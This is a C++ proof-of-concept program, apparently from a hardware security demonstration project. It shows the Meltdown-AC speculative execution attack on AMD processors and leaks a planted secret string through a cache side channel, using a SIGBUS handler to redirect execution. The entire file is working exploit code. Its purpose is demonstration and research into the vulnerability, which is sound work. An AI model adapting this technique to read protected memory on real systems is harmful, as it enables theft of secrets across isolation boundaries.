/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstrates Meltdown-AC - speculative fetching of unaligned data when
 * alignment is enforced. This vulnerability seems to be AMD-specific. It should
 * not work on Intel CPUs.
 *
 * We create an array of words, shift them by one byte to make them unaligned
 * and then we copy the public and private data into respective unaligned
 * arrays - one character is stored into one unaligned word.
 * Afterwards we turn on the alignment enforcement and try to read the
 * unaligned private array with that enforcement. That always leads to SIGBUS
 * however the unaligned data are processed speculatively.
 * It is necessary to have the AM (alignment mask) in CR0 register turned on,
 * but on Linux it is a standard configuration. If the AM bit is off, the
 * demonstration runs into the unreachable code and terminates with a failure.
 **/

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if !defined(__i386__) && !defined(__x86_64__)
#  error Unsupported architecture. AMD required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// Storage for the public data.
size_t *public_array = new size_t[strlen(public_data) + 1];
// Disaligned array of public data shifted by one byte.
size_t *disaligned_public_data = reinterpret_cast<size_t *>(
    reinterpret_cast<char *>(public_array) + 1);

// Storage for the private data.
size_t *private_array = new size_t[strlen(private_data) + 1];
// Disaligned array of private data shifted by one byte.
size_t *disaligned_private_data = reinterpret_cast<size_t *>(
    reinterpret_cast<char *>(private_array) + 1);

static void InitializeDisalignedData() {
  // Initialize disaligned arrays.
  for (size_t i = 0; i < strlen(public_data); ++i) {
    disaligned_public_data[i] = public_data[i];
  }
  for (size_t i = 0; i < strlen(private_data); ++i) {
    disaligned_private_data[i] = private_data[i];
  }
}

static char LeakByte(size_t *disaligned_data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Successful execution accesses safe_offset and loads ForceRead code into
    // cache.
    ForceRead(isolated_oracle.data() + disaligned_data[safe_offset]);

    EnforceAlignment();
    MemoryAndSpeculationBarrier();

    // Accesses unaligned data despite of the enforcement. Triggers SIGBUS.
    ForceRead(isolated_oracle.data() + disaligned_data[offset]);

    // Architecturally dead code. Never reached unless AM flag in CR0 is off.
    std::cout << "Dead code. Must not be printed. "
              << "Maybe you have to flip on the AM flag in CR0." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGBUS signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    // We must turn off the enforcement for the cache hit computations, because
    // otherwise it would trigger SIGBUS in C++ STL (e.g. strcmp invocations).
    UnenforceAlignment();

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void sigbus(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGBUS signal handler.
  // Moves the instruction pointer to the "afterspeculation" label.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
#ifdef __x86_64__
  ucontext->uc_mcontext.gregs[REG_RIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#else
  ucontext->uc_mcontext.gregs[REG_EIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#endif
}

static void SetSignal() {
  struct sigaction act;
  act.sa_sigaction = sigbus;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGBUS, &act, NULL);
}

int main() {
  InitializeDisalignedData();
  SetSignal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  size_t private_offset = disaligned_private_data - disaligned_public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(disaligned_public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
